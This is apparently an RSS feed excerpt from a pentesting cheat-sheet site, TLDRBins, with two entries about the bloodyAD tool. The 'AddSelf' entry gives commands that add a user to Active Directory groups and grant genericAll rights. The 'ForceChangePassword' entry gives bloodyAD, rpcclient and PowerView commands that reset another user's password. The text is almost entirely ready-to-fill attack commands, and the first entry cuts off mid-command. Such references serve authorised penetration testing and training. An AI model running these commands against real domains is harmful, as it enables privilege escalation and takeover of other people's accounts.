channel.title: BloodyAD on TLDRBins
channel.description: Recent content in BloodyAD on TLDRBins

item.title: AddSelf
item.description: Privesc #1: Add self to group (From Linux) bloodyAD powerview.py 1. Add self to group # With password python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember <GROUP> '<USER>' # With Kerberos python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -k --host <DC> add groupMember <GROUP> '<USER>' 2. Add genericAll over target group # With password python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>' # With Kerberos python3 bloodyAD.

item.title: ForceChangePassword
item.description: Change target user password (From Linux) BloodyAD rpcclient python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> set password <TARGET_USER> '<NEW_PASSWORD>' Ref: bloodyAD rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <TARGET_USER_NEW_PASSWORD>' Change target user password (From Windows) Windows 1. Import PowerView . .\PowerView.ps1 2. Change Target User Password $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
